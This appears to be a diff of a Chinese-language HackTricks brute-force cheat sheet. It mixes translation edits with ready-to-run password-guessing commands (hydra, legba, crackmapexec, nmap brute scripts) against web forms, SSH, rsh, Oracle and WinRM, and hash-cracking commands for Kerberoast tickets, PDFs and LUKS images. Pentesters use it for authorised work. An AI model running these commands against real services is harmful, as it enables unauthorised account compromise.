@@ -1,4 +1,4 @@
-# 暴力破解 - 备忘单
+# Brute Force - CheatSheet
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -21,7 +21,7 @@
 
 ## **创建你自己的字典**
 
-尽可能多地收集目标的信息并生成自定义字典。可能有帮助的工具：
+尽可能多地收集关于目标的信息并生成自定义字典。可能有帮助的工具：
 
 ### Crunch
 ```bash
@@ -34,9 +34,16 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### Cewl
+### 基于网站的字典列表
 ```bash
+# Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
+
+# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
+cat /path/to/urls.txt | tok
+
+# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
+cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
@@ -46,7 +53,7 @@ python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-一个词汇生成工具，允许您提供一组单词，使您能够从给定的单词中制作多个变体，创建一个独特且理想的词汇表，以便针对特定目标使用。
+一个单词列表生成工具，允许您提供一组单词，使您能够从给定的单词中制作多个变体，创建一个独特且理想的单词列表，以便针对特定目标使用。
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -144,7 +151,7 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - Post 表单
+### HTTP - Post Form
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
@@ -275,7 +282,7 @@ legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin -
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[离线 OracleSQL 哈希暴力破解](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**版本 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** 和 **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**版本 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** 和 **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -332,6 +339,8 @@ hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
+[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)
+
 ### Rsync
 ```bash
 nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
@@ -391,13 +400,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### 弱 SSH 密钥 / Debian 可预测的 PRNG
+#### 弱 SSH 密钥 / Debian 可预测 PRNG
 
 一些系统在生成加密材料时使用的随机种子存在已知缺陷。这可能导致密钥空间显著减少，可以使用工具如 [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) 进行暴力破解。也可以找到预生成的弱密钥集，如 [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)。
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ 和 OpenMQ)
 
-STOMP 文本协议是一种广泛使用的消息传递协议，**允许与流行的消息队列服务无缝通信和交互**，如 RabbitMQ、ActiveMQ、HornetQ 和 OpenMQ。它提供了一种标准化和高效的方法来交换消息并执行各种消息操作。
+STOMP 文本协议是一种广泛使用的消息传递协议，**允许与流行的消息队列服务如 RabbitMQ、ActiveMQ、HornetQ 和 OpenMQ 进行无缝通信和交互**。它提供了一种标准化和高效的方法来交换消息和执行各种消息操作。
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -440,8 +449,8 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ### 在线破解数据库
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 有/没有 ESS/SSP 和任何挑战值)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (哈希, WPA2 捕获, 和 MSOffice, ZIP, PDF 的档案...)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 有/无 ESS/SSP 和任何挑战值)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (哈希, WPA2 捕获, 和 MSOffice, ZIP, PDF... 的档案)
 - [https://crackstation.net/](https://crackstation.net) (哈希)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
 - [https://gpuhash.me/](https://gpuhash.me) (哈希和文件哈希)
@@ -504,9 +513,9 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### PDF所有者密码
+### PDF Owner Password
 
-要破解PDF所有者密码，请查看此链接: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+要破解 PDF 拥有者密码，请查看此链接: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -540,9 +549,9 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Luks图像
+### Lucks 图像
 
-#### 方法1
+#### 方法 1
 
 安装: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
@@ -606,27 +615,27 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 
 **哈希示例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
-### 哈希识别器
+### Hash-identifier
 ```bash
 hash-identifier
 > <HASH>
 ```
-### 字典
+### Wordlists
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **字典生成工具**
+### **Wordlist Generation Tools**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 高级键盘行走生成器，具有可配置的基础字符、键盘映射和路线。
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 高级键盘行走生成器，具有可配置的基本字符、键盘映射和路线。
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
 ### John mutation
 
-阅读 _**/etc/john/john.conf**_ 并进行配置
+读取 _**/etc/john/john.conf**_ 并进行配置
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
